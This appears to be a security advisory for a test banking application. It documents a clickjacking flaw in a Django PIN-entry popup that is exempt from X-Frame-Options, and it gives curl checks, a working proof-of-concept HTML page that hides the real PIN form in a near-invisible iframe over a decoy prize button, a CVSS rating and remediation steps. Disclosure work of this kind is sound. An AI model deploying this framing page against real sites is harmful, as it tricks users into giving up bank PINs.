# Description

The bank PIN confirmation popup is served without clickjacking protection. `popup_action_view` in `Bank/views.py:69-73` is decorated with `@xframe_options_exempt` (imported at `Bank/views.py:11`), which tells Django's `XFrameOptionsMiddleware` to omit the `X-Frame-Options` header for that response. The rest of the site sends `X-Frame-Options: DENY`, so this single endpoint can be embedded in any third-party page.

The endpoint is routed at `Bank/urls.py:52` as `payment/popup-action/<str:sid>` (mounted under `/banking/`, giving `GET /banking/payment/popup-action/<sid>`). It renders `payments/ask_pin.html`, the PIN entry form, so an attacker can frame the real PIN form and overlay a decoy UI on top of it.

This is **CWE-1021: Improper Restriction of Rendered UI Layers or Frames**. The application fails to prevent its sensitive PIN input from being rendered inside a frame controlled by an attacker. A victim who is logged in and visits the attacker's page can be induced to type their bank PIN into the framed form while believing they are interacting with an unrelated widget (a CAPTCHA, a prize button, a survey). The attack requires no malware and no XSS, only a crafted link or page and a click.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Confirm the popup is frameable: `curl -sD - "http://localhost:8000/banking/dashboard/" -o /dev/null \| grep -i x-frame` | `X-Frame-Options: DENY` is returned on normal banking pages |
| 2 | Repeat against the popup: `curl -sD - "http://localhost:8000/banking/payment/popup-action/test123" -o /dev/null \| grep -i x-frame` | No `X-Frame-Options` header is returned, so the page can be framed |
| 3 | Host the PoC HTML (below) on an attacker-controlled origin, with the `<iframe>` `src` pointing at the real popup URL | The real PIN form loads inside an invisible iframe positioned over a decoy button |
| 4 | Lure an authenticated victim to the attacker page and have them click the decoy ("Claim your prize") | The click lands on the PIN input inside the transparent iframe, and the victim types their PIN into the real form |
| 5 | Submit the framed form (or have the decoy trigger it) | The PIN is sent to the banking backend as the victim, and the attacker can then use the captured PIN for follow-on banking actions (for example M14 protocol injection or E3 IDOR, per the dev catalog) |

# PoC

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Claim your prize</title>
</head>
<body>
  <div style="position:relative; width:400px; height:300px;">
    <!-- Real PIN popup, framed without X-Frame-Options -->
    <iframe src="http://localhost:8000/banking/payment/popup-action/fakesid"
            style="opacity:0.01; position:absolute; top:0; left:0; width:400px; height:300px; z-index:2; border:0;">
    </iframe>

    <!-- Decoy UI shown to the victim -->
    <button style="position:absolute; top:50px; left:100px; z-index:1; padding:12px 24px;">
      Click here to claim your prize!
    </button>
  </div>
</body>
</html>
```

The iframe is nearly invisible (`opacity:0.01`) and sits above the decoy button (`z-index:2` vs `z-index:1`). Clicks on the button are delivered to the iframe, so the victim interacts with the real PIN field.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | The victim's bank PIN is disclosed to the attacker through the overlaid form. The PIN is the credential that unlocks banking data, so it is the primary secret exposed. |
| Integrity | With a captured PIN the attacker can perform banking operations as the victim, such as payments or transfers, when chained with other endpoints (M14, E3). |
| Availability | No direct impact. The attack does not disrupt service. |

Overall severity: **Medium** (CVSS 3.1 score 4.7, vector `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N`). The attack needs a victim click (UI:R) and a crafted page (AC:H), and the direct impact is limited to the PIN disclosure. Severity rises if the captured PIN is chained into fund-moving operations, which is why the scope is marked changed (S:C).

# Remediation

1. Remove `@xframe_options_exempt` from `popup_action_view` (`Bank/views.py:69`). The PIN popup should never be embeddable in a third-party frame.
2. Keep `X_FRAME_OPTIONS = 'DENY'` as the global Django default and do not override it on sensitive views. Use `SAMEORIGIN` only where same-origin framing is genuinely required.
3. Add `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) to sensitive responses as a modern complement to `X-Frame-Options`.
4. Review every view decorated with `@xframe_options_exempt` in the codebase, including `Chatbot/views.py:207`, and confirm that framing is required for each one. Views that handle credentials or money should not be exempt.
5. Consider a frame-busting check or a user-interaction confirmation step (re-entering the PIN on a same-origin page, or a visible confirmation dialog) for any credential entry, as defense in depth.

# Author
WOCSA
